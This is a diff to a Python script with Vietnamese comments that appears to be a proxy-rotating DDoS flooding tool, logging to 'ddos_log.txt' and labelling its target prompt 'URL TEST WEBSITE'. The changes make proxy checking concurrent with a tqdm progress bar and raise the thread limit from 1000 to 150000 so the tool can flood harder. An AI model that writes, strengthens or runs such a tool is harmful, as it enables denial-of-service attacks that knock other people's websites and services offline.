@@ -61,7 +61,8 @@ def install_module(module_name, max_attempts=3):
 module_mappings = {
     "scikit-learn": "sklearn",
     "beautifulsoup4": "bs4",
-    "webdriver-manager": "webdriver_manager"
+    "webdriver-manager": "webdriver_manager",
+    "tqdm": "tqdm"
 }
 
 # Danh sách module cần thiết
@@ -74,15 +75,17 @@ required_modules = [
     "numpy",
     "beautifulsoup4",
     "selenium",
-    "webdriver-manager"
+    "webdriver-manager",
+    "tqdm"
 ]
 
 # Cài đặt các module đồng thời
 with ThreadPoolExecutor(max_workers=4) as executor:
     executor.map(install_module, required_modules)
 
-# Nhập module pystyle sau khi đảm bảo cài đặt
+# Nhập các module sau khi đảm bảo cài đặt
 from pystyle import Colors, Colorate
+from tqdm import tqdm
 
 # Kiểm tra quyền ghi log
 try:
@@ -130,9 +133,19 @@ class ProxyManager:
         proxies = self.load_proxies()
         valid_proxies = []
         print("Đang kiểm tra proxy hoạt động...")
-        for proxy in proxies:
-            if await self.test_proxy({"http": proxy, "https": proxy}):
-                valid_proxies.append(proxy)
+        
+        # Kiểm tra tất cả proxy đồng thời với tqdm
+        max_concurrent = len(proxies)  # Kiểm tra đồng thời tất cả proxy
+        tasks = [self.test_proxy({"http": proxy, "https": proxy}) for proxy in proxies]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        
+        # Cập nhật thanh tiến trình
+        with tqdm(total=len(proxies), desc="Kiểm tra proxy", unit="proxy") as pbar:
+            for proxy, result in zip(proxies, results):
+                if isinstance(result, bool) and result:
+                    valid_proxies.append(proxy)
+                pbar.update(1)
+        
         self.proxy_cache = deque(valid_proxies)
         print(f"Đã lọc, còn {len(self.proxy_cache)} proxy hoạt động.")
         with open("ddos_log.txt", "a") as f:
@@ -454,15 +467,15 @@ def main():
     banner()
     print("\033[1;31m!!KHI NHẬP WEBSITE LƯU Ý PHẢI NHẬP https:// hoặc http://")
     url = input(Colorate.Horizontal(Colors.purple_to_blue, "[</>] URL TEST WEBSITE: "))
-    threads = int(input(Colorate.Horizontal(Colors.purple_to_blue, "[</>] ENTER THREAD COUNT (100-1000): ")))
+    threads = int(input(Colorate.Horizontal(Colors.purple_to_blue, "[</>] ENTER THREAD COUNT (1000-150000): ")))
 
     # Kiểm tra đầu vào
     import re
     if not re.match(r'^https?://', url):
         print(Colorate.Horizontal(Colors.red_to_white, "Lỗi: URL phải bắt đầu bằng http:// hoặc https://"))
         return
-    if not (100 <= threads <= 1000):
-        print(Colorate.Horizontal(Colors.red_to_white, "Lỗi: Số luồng phải từ 100 đến 1000"))
+    if not (1000 <= threads <= 150000):
+        print(Colorate.Horizontal(Colors.red_to_white, "Lỗi: Số luồng phải từ 1000 đến 150000"))
         return
 
     # Phân tích website
@@ -485,7 +498,7 @@ def main():
         await asyncio.gather(*tasks)
 
     try:
-        max_workers = min(1000, psutil.cpu_count() * 100)
+        max_workers = min(150000, psutil.cpu_count() * 100)
         with ThreadPoolExecutor(max_workers=max_workers) as executor:
             while True:
                 loop.run_until_complete(run_requests())
